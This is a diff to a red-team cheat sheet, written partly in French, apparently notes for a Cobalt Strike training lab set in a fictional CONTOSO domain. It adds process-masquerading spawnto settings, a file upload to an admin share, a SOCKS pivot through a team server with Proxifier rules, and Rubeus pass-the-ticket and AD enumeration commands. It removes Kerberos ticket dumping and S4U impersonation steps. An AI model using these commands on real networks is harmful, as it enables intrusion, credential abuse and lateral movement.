@@ -32,6 +32,7 @@ spawnas CONTOSO\rsteel Passw0rd! tcp-local
 - **spawnto** changes the sacrificial process for fork & run commands.
 ```
 spawnto x64 C:\Windows\System32\dllhost.exe
+spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\\Application\msedge.exe"
 ```
 
 Commandes affectée par `spawnto` :
@@ -85,27 +86,14 @@ jump scshell64 lon-ws-1 smb
 ```
 
 ---
-# Kerberos
-[Délégations Kerberos](../ActiveDirectory/Délégations%20Kerberos.md)
-[Kerberos](../ActiveDirectory/Kerberos.md)
-
-```
-krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]
-
-krb_dump /luid:3e7 /service:krbtgt
-
-C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIF8[...snip...]MtMSQ=
-
-krb_s4u /ticket:[TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
-```
-
----
 # ShareWrite
 
 ```
-net use \\<IP_CIBLE>\<PARTAGE> /user:<DOMAINE>\<utilisateur> <mot_de_passe>
-
 shell copy C:\rto.txt \\lon-ws-1\C$\rto.txt
+
+cd \\enc-fs-1\c$
+pwd (confirm you're there)
+upload C:\Users\Attacker\Desktop\rto.txt
 ```
 
 Ou alors mouvement latéral sur la machine et écriture depuis CS avec File browser -> upload
@@ -185,3 +173,71 @@ download \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493E
 
 Parse-PolFile -Path .\Desktop\Registry.pol
 ```
+
+# Pivoting - SOCKS Proxies
+
+## Socks
+Start a SOCKS proxy.
+```
+socks 1080 socks5
+```
+
+## DNS
+  
+Add static DNS records for _lon-dc-1_ and _contoso.com_:
+```
+Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
+```
+
+## Proxifier
+
+### Proxy Server
+
+Add the team server as a new proxy server:
+1. **Profile > Proxy Servers**
+2. Click **Add**.
+3. Address: 10.0.0.5
+4. Port: 1080
+5. Protocol: **SOCKS Version 5**
+6. Click **OK**.
+
+> A box will appear asking if you want to use this proxy by default. Click **No**.
+
+7. Click **OK** again.
+
+> Another box will appear asking if you want to edit Proxification Rules. Click **Yes**.
+
+### Proxification Rules
+
+Add a new rule that will proxy any traffic from any application, on any port destined for the target network, through the team server.
+1. Click **Add**.
+2. Name: **Beacon**
+3. Target hosts: 10.10.120.0/23
+4. Action: **Proxy SOCKS5 10.0.0.5**
+5. Click **OK**.
+6. Click **OK** again.
+
+## LDAP Service Ticket
+
+1. From Terminal, run a new netonly PowerShell process.
+```
+runas /netonly /user:CONTOSO\rsteel powershell.exe
+```
+Password: `FakePass`
+
+2. Use the user's TGT to request a service ticket for LDAP and pass it into the current session.
+```
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
+```
+
+3. The native klist command won't work here, so verify the ticket using Rubeus.
+```
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
+```
+
+## Domain Enumeration
+
+1. Use the native AD RSAT cmdlets to query the domain.
+    1. `Get-ADComputer -Filter * -Server lon-dc-1`
+    2. `Get-ADUser -Filter * -Server lon-dc-1`
+    3. `Get-ADOrganizationalUnit -Filter * -Server lon-dc-1`
